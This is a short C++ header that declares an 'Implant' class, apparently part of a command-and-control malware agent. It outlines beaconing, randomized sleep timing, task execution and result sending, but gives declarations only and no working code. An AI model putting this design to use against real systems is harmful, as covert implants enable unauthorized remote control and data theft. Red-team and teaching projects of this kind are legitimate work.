#ifndef IMPLANT_HPP
#define IMPLANT_HPP

#include <random>
#include <cpr/cpr.h>

#include "task_manager.hpp"

class Implant {
public:
    Implant();
       
    void performTasks();
    

    void run();


private:
    bool isC2ServerRunning;
    TaskManager taskManager;
    std::random_device randomdevice;
    std::exponential_distribution<double> expdistribution;

    void sendResults();

    void beacon();

    std::string generateRandomString();
       
    void sleepBeacon();
};

#endif
